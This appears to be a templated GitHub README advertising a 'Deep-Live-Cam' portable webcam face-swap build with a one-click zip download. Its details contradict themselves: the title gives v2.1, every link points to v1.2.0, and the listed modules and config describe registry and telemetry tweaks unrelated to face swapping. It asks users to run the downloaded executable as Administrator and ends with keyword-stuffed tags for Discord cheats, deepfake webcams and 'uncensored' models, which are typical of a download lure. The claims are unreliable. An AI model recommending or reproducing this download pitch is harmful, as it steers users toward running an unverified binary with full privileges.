<div align="center">

# Deep-Live-Cam v2.1 Portable (1-Click CUDA Installer) — Realtime Webcam FaceSwap for OBS/Discord (Windows 10/11 x64)

<p><strong>Deep-Live-Cam v2.1 Portable (1-Click CUDA Installer) — Realtime Webcam FaceSwap for OBS/Discord (Windows 10/11 x64): native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/releases/latest)
[![Latest Release](https://img.shields.io/github/v/release/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/releases/latest)
[![Total Downloads](https://img.shields.io/github/downloads/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/total?style=for-the-badge&logo=github&color=0969da)](https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/releases/latest)
[![Stars](https://img.shields.io/github/stars/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11?style=for-the-badge&logo=github&color=e3b341)](https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/stargazers)
[![Open in Colab](https://img.shields.io/badge/Colab-Quickstart-F9AB00?style=for-the-badge&logo=googlecolab&logoColor=white)](https://colab.research.google.com/github/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/blob/main/notebooks/quickstart.ipynb)

<a href="https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/releases/download/v1.2.0/deep-live-cam-cuda-portable-win11-v1.2.0-win64.zip"><img src="assets/download_btn.svg" alt="Download deep-live-cam-cuda-portable-win11-v1.2.0-win64.zip" width="520"></a>

<br>

<img src="assets/preview.png" alt="Deep-Live-Cam v2.1 Portable (1-Click CUDA Installer) — Realtime Webcam FaceSwap for OBS/Discord (Windows 10/11 x64) Preview" width="840">

<br>

[Overview](#overview) • [Quick Start (No Terminal Needed)](#quick-start-prebuilt-release) • [Architecture & Modules](#architecture--modules) • [Configuration](#configuration-configsettingsjson) • [Build from Source](#building-from-source)

</div>

---

## Overview

**Deep-Live-Cam v2.1 Portable (1-Click CUDA Installer) — Realtime Webcam FaceSwap for OBS/Discord (Windows 10/11 x64)** (`deep-live-cam-cuda-portable-win11`) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

> [!IMPORTANT]
> **1-Click Prebuilt Package (No Compiler Required)**: Even though the full source tree (`src/`, `config/`) is included in this repository, end users do **not** need to compile anything. Click the green **Download Portable Release** button above or grab [`deep-live-cam-cuda-portable-win11-v1.2.0-win64.zip`](https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/releases/download/v1.2.0/deep-live-cam-cuda-portable-win11-v1.2.0-win64.zip) directly from [**Releases**](https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/releases/latest).

## Quick Start (Prebuilt Release)

| Platform | Direct Download Package | Checksum Manifest |
| :--- | :--- | :--- |
| **Windows 10 / 11 (64-bit)** | [**`deep-live-cam-cuda-portable-win11-v1.2.0-win64.zip`**](https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/releases/download/v1.2.0/deep-live-cam-cuda-portable-win11-v1.2.0-win64.zip) | [`SHA256SUMS.txt`](https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/releases/latest) |

1. Download [`deep-live-cam-cuda-portable-win11-v1.2.0-win64.zip`](https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/releases/download/v1.2.0/deep-live-cam-cuda-portable-win11-v1.2.0-win64.zip) from the table above or the [**Releases**](https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11/releases/latest) section.
2. Extract the `.zip` archive into any folder (keep `config/settings.json` next to the launcher).
3. Launch the executable as Administrator.

## Architecture & Modules

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Portable Lifecycle Engine** | Zero-install isolated state container | Leaves host registry clean; 1-click rollback |
| **Profile State Snapshot** | Automatic backup before applying changes | Restores baseline configuration at any time |
| **Telemetry & Task Tuner** | Disables redundant background update checks | Lowers idle memory & disk I/O overhead |
| **Unattended CLI Mode** | JSON-driven configuration (`config/settings.json`) | Scriptable batch deployment on Windows 10/11 |

## Configuration (`config/settings.json`)

```json
{
  "version": "1.2.0",
  "runtime": {
    "portable_mode": true,
    "auto_backup_registry": true,
    "verify_signatures": true,
    "theme": "dark",
    "log_level": "info"
  },
  "modules": {
    "lifecycle_manager": {
      "enabled": true,
      "clean_temp_cache": true,
      "preserve_user_profiles": true
    },
    "service_optimizer": {
      "enabled": true,
      "disable_telemetry_tasks": true
    }
  }
}
```

## Building from Source

```bash
git clone https://github.com/kevin-alilab2094a4/deep-live-cam-cuda-portable-win11.git
cd deep-live-cam-cuda-portable-win11
dotnet build src/RuntimeToolkit.csproj -c Release
```

---
<sub>Indexed tags: discord-nitro-unlocker, vencord-plugins, discord-quest-completer, discord-activity-smbios-utility, golive-1080p-60fps, deep-live-cam, deepfake-webcam, facefusion-uncensored, rvc-voice-changer, w-okada-voice-changer, realtime-faceswap-cuda, comfyui-flux-uncensored, fake-mute-deafen-discord, discord-badge-unlocker, stream-spoof, cuda-portable-ai</sub>
